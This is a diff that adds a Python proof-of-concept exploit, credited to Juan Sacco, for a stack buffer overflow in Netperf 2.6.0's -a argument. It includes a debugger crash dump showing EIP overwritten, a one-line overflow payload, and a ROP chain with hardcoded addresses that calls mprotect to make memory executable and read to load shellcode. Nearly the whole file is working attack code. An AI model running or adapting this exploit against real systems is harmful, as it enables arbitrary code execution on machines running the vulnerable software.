@@ -1,0 +1,59 @@
+# Exploit Author: Juan Sacco <jsacco@exploitpack.com> - http://exploitpack.com
+#
+# Tested on: Kali i686 GNU/Linux
+#
+# Description: Netperf 2.6.0 s a benchmark tool than developed by Helett Packard that can be used to measure the performance of many different types of networking.
+# It provides tests for both unidirectional troughput and end-to-end latency.
+#
+# Vendor: https://hewlettpackard.github.io/netperf/
+#
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x41424344 in ?? ()
+# LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+#  EAX  0x6d
+#  EBX  0x41414141 ('AAAA')
+#  ECX  0x6f
+#  EDX  0x430320 (test_name) 'TCP_STREAM'
+#  EDI  0xb7ea2000 (_GLOBAL_OFFSET_TABLE_)
+#  ESI  0xbfffd2c0 0x3
+#  EBP  0x41414141 ('AAAA')
+#  ESP  0xbfffd280 0x0
+#  EIP  0x41424344 ('DCBA')
+# Invalid address 0x41424344
+# Program received signal SIGSEGV (fault address 0x41424344)
+# PoC: run -a `python -c 'print "A"*8220+"DCBA"'`
+
+from struct import pack
+
+# int mprotect(void *addr, size_t len, int prot);
+# define PROT_READ       0x1
+# define PROT_WRITE      0x2
+# define PROT_EXEC       0x4
+#
+# gef  p mprotect
+# $1 = {<text variable, no debug info>} 0xb7dbdfd0 <mprotect>
+# gef  p read
+#{ssize_t (int, void *, size_t)} 0xb7db06b0 <__GI___libc_read>
+#
+# gef  ropgadget
+#pop3ret = 0x402fea
+
+offset = 8220
+mprotect = 0xb7dbdfd0 # <mprotect>
+read = 0xb7db06b0 # <read>
+pop3ret = 0x402fea
+target_memory = 0xb7fd4000 # r-xp [vdso]
+
+rop_chain = 'A' * offset
+rop_chain += pack('I', mprotect) # mprotect
+rop_chain += pack('I', pop3ret) #  gadget
+rop_chain += pack('I', 0xbffdf000) # arg - void*
+rop_chain += pack('I', 0x100000) # arg size_t
+rop_chain += pack('I',0x7) # arg int
+rop_chain += pack('I', read)
+rop_chain += pack('I', 0xbffdf000) # return stack
+rop_chain += pack('I',0x00) # arg int fd
+rop_chain += pack('I',0xbffdf000) # arg void
+rop_chain += pack('I',0x200) # arg size_t
+
+print rop_chain
